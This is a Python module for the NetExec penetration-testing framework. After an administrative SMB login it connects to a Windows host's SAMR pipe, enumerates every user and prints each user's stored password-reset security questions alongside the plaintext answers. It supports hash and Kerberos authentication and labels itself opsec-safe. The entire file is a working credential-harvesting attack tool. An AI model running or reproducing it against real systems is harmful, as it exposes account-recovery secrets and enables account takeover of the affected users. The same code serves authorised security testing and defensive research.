from impacket.dcerpc.v5 import samr, transport
from impacket.nt_errors import STATUS_MORE_ENTRIES
from impacket.dcerpc.v5.rpcrt import DCERPCException
from json import loads
from traceback import format_exc as traceback_format_exc

class NXCModule:
    """
    Module by Adamkadaban: @Adamkadaban
    Based on research from @0gtweet (@gtworek)

    Much of this code was copied from add_computer.py
    Reference: https://hackback.zip/2024/05/08/Remotely-Dumping-Windows-Security-Questions-With-Impacket.html
    """

    name = "security-questions"
    description = "Gets security questions and answers for users on computer"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module):
        pass

    def on_admin_login(self, context, connection):
        self.__domain = connection.domain
        self.__domainNetbios = connection.domain
        self.__kdcHost = connection.hostname + "." + connection.domain
        self.__target = self.__kdcHost
        self.__username = connection.username
        self.__password = connection.password
        self.__targetIp = connection.host
        self.__port = context.smb_server_port
        self.__aesKey = context.aesKey
        self.__hashes = context.hash
        self.__doKerberos = connection.kerberos
        self.__nthash = ""
        self.__lmhash = ""

        if context.hash and ":" in context.hash[0]:
            hashList = context.hash[0].split(":")
            self.__nthash = hashList[-1]
            self.__lmhash = hashList[0]
        elif context.hash and ":" not in context.hash[0]:
            self.__nthash = context.hash[0]
            self.__lmhash = "00000000000000000000000000000000"

        self.getSAMRResetInfo(context)

    def getSAMRResetInfo(self, context):
        string_binding = f"ncacn_np:{self.__targetIp}[\\pipe\\samr]"
        rpc_transport = transport.DCERPCTransportFactory(string_binding)
        rpc_transport.set_dport(445)
        rpc_transport.setRemoteHost(self.__targetIp)

        if hasattr(rpc_transport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            rpc_transport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)
        rpc_transport.set_kerberos(self.__doKerberos, self.__kdcHost)

        try:
            dce = rpc_transport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            # obtain server handle for samr connection
            resp = samr.hSamrConnect(dce)
            server_handle = resp["ServerHandle"]

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
            domains = resp["Buffer"]["Buffer"]

            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domains[0]["Name"])

            # obtain domain handle for samr connection
            resp = samr.hSamrOpenDomain(dce, serverHandle=server_handle, domainId=resp["DomainId"])
            domain_handle = resp["DomainHandle"]

            status = STATUS_MORE_ENTRIES
            enumeration_context = 0

            # try to iterate through users in domain entries for connection
            while status == STATUS_MORE_ENTRIES:
                try:
                    resp = samr.hSamrEnumerateUsersInDomain(dce, domain_handle, enumerationContext=enumeration_context)
                except DCERPCException as e:
                    if str(e).find("STATUS_MORE_ENTRIES") < 0:
                        raise 
                    resp = e.get_packet()

                for user in resp["Buffer"]["Buffer"]:
                    try:
                        context.log.info(f"Querying security questions for User: {user['Name']}")
                        # request SAMR ID 30
                        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6
                        r = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, user["RelativeId"])
                        info = samr.hSamrQueryInformationUser2(dce, r["UserHandle"], samr.USER_INFORMATION_CLASS.UserResetInformation)

                        reset_data = info["Buffer"]["Reset"]["ResetData"]
                        if reset_data == b"":
                            continue
                        reset_data = loads(reset_data)
                        questions = reset_data["questions"]

                        if len(questions) == 0:
                            context.log.highlight(f"User {user['Name']} has no security questions")
                        else:
                            for qna in questions:
                                question = qna["question"]
                                answer = qna["answer"]
                                context.log.highlight(f"{user['Name']} - {question}: {answer}")

                        samr.hSamrCloseHandle(dce, r["UserHandle"])
                    except samr.DCERPCException as e:
                        if "STATUS_INVALID_INFO_CLASS" in str(e):
                            context.log.debug(f"Failed to query security questions for User: {user['Name']}: {e!s}")
                            continue
                        else:
                            context.log.fail(f"Failed to query security questions for User: {user['Name']}: {e!s}")
                            context.log.debug(traceback_format_exc())
                enumeration_context = resp["EnumerationContext"]
                status = resp["ErrorCode"]

        except Exception as e:
            context.log.fail(f"Error: {e}")
            context.log.debug(traceback_format_exc())

        finally:
            if domain_handle is not None:
                samr.hSamrCloseHandle(dce, domain_handle)
            if server_handle is not None:
                samr.hSamrCloseHandle(dce, server_handle)
            dce.disconnect()
